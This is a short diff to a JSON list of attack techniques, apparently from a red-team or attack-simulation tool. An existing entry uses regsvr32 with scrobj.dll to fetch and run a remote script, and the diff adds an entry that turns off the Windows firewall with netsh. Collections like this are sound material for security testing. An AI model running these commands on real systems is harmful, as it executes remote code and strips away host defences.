@@ -33,6 +33,12 @@
         "vector_name":"ScrobjRemoteExec",
         "vector_cn_name":"Scrobj远程脚本执行",
         "command":"regsvr32 /s /n /u /i:http://127.0.0.1/1.sct scrobj.dll"
+    },
+
+    {
+        "vector_name":"CloseFireWall",
+        "vector_cn_name":"关闭防火墙",
+        "command":"netsh advfirewall set allprofiles state off"
     }
 
 ]
